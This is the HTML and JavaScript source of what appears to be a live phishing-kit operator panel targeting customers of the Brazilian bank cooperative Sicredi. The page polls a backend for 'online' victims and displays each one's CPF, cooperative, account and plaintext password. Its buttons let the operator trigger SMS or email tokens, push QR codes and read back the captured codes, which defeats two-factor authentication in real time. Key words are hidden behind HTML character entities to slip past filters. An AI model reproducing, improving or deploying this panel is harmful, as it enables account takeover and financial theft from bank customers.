<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Painel Operador S&#x69;credi</title>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Nunito', sans-serif;
      background-color: #f4f7fa;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
    }
    .container {
      background-color: #ffffff;
      border-radius: 16px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
      padding: 30px;
      width: 100%;
      max-width: 850px;
      text-align: center;
    }
    h2 {
      color: #33820D;
      margin-bottom: 25px;
      font-size: 24px;
    }
    .cliente {
      background-color: #e9f5ec;
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 18px;
      box-shadow: 0 3px 8px rgba(0,0,0,0.05);
      text-align: left;
      position: relative;
      opacity: 0;
      transform: translateY(10px);
      animation: fadeIn 0.4s ease-out forwards;
    }
    @keyframes fadeIn {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    .ping {
      position: absolute;
      top: 15px;
      right: 15px;
      width: 12px;
      height: 12px;
      background-color: #00c853;
      border-radius: 50%;
      animation: ping 1.5s infinite;
    }
    @keyframes ping {
      0% { transform: scale(1); opacity: 1; }
      70% { transform: scale(1.8); opacity: 0; }
      100% { transform: scale(1.8); opacity: 0; }
    }
    .credenciais {
      font-size: 14px;
      margin-top: 8px;
      color: #333;
    }
    .tokens {
      background-color: #ffffff;
      padding: 10px;
      border-radius: 6px;
      margin-top: 10px;
      border: 1px solid #ddd;
      font-size: 13px;
      max-height: 150px;
      overflow-y: auto;
      white-space: pre-line;
    }
    .actions, .file-upload {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 8px;
      margin-top: 10px;
    }
    button {
      background-color: #33820D;
      color: white;
      padding: 6px 14px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #2a6c0f;
    }
    .delete-btn {
      background-color: #b92727;
    }
    .delete-btn:hover {
      background-color: #8a1f1f;
    }
    .file-upload input[type="file"] {
      flex-grow: 1;
    }
    .header-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
  </style>
</head>
<body>
<div class="container">
  <h2>Painel Operador S&#x69;credi</h2>
  <div id="clientes">Carregando cl&#x69;entes...</div>
</div>
<script>
  let intervaloAtualizacao;

  async function carregarClientes() {
    const res = await fetch('api.php?acao=listar_clientes');
    const clientes = await res.json();
    const container = document.getElementById('clientes');

    if (container.dataset.carregado === "true") {
      clientes.forEach(cliente => carregarTokens(cliente.cpf));
      return;
    }

    if (!Array.isArray(clientes) || clientes.length === 0) {
      container.innerHTML = '<p>Nenhum cl&#x69;ente online no momento.</p>';
      container.dataset.carregado = "false";
      return;
    }

    container.innerHTML = '';
    container.dataset.carregado = "true";

    for (const cliente of clientes) {
      const box = document.createElement('div');
      box.className = 'cliente';
      box.id = `cliente_${cliente.cpf}`;
      box.innerHTML = `
        <div class="header-row">
          <strong>C&#x50;F/C&#x4E;PJ:</strong> ${cliente.cpf}
          <button class="delete-btn" onclick="excluirCliente('${cliente.cpf}')">Excluir</button>
        </div>
        <div class="credenciais">
          <strong>Co&#x6F;perativa:</strong> ${cliente.cooperativa}<br>
          <strong>Co&#x6E;ta:</strong> ${cliente.conta}<br>
          <strong>S&#x65;nha:</strong> ${cliente.senha}
        </div>
        <div class="actions">
          <button onclick="solicitarToken('${cliente.cpf}', 'sms')">Solicitar SMS</button>
          <button onclick="solicitarToken('${cliente.cpf}', 'email')">Solicitar Email</button>
        </div>
        <div class="file-upload">
          <input type="file" id="qr_${cliente.cpf}" accept="image/png">
          <button onclick="enviarQR('${cliente.cpf}')">Enviar QR Code</button>
        </div>
        <div class="tokens" id="tokens_${cliente.cpf}">Carregando to&#x6B;ens...</div>
      `;
      container.appendChild(box);
      carregarTokens(cliente.cpf);
    }
  }

  function solicitarToken(cpf, tipo) {
    fetch('api.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `acao=solicitar&tipo=${tipo}&cpf=${cpf}`
    }).then(res => res.text()).then(alert);
  }

  function enviarQR(cpf) {
    const fileInput = document.getElementById('qr_' + cpf);
    const file = fileInput.files[0];
    if (!file) {
      alert('Selecione um arquivo PNG.');
      return;
    }
    const formData = new FormData();
    formData.append('acao', 'enviar_qrcode');
    formData.append('qr_code', file);
    formData.append('cpf', cpf);
    fetch('api.php', {
      method: 'POST',
      body: formData
    }).then(res => res.text()).then(alert);
  }

  function carregarTokens(cpf) {
    fetch(`api.php?acao=obter_tokens&cpf=${cpf}`)
      .then(res => res.text())
      .then(data => {
        const tokenDiv = document.getElementById(`tokens_${cpf}`);
        if (tokenDiv) {
          tokenDiv.innerHTML = data ? data.replace(/\n/g, "<br>") : 'Nenhum to&#x6B;en.';
        }
      });
  }

  function excluirCliente(cpf) {
    if (!confirm('Tem certeza que deseja excluir este cl&#x69;ente?')) return;
    fetch('api.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `acao=cliente_offline&cpf=${cpf}`
    }).then(() => {
      const clienteDiv = document.getElementById(`cliente_${cpf}`);
      if (clienteDiv) clienteDiv.remove();
    });
  }

  carregarClientes();
  intervaloAtualizacao = setInterval(carregarClientes, 5000);
</script>
</body>
</html>
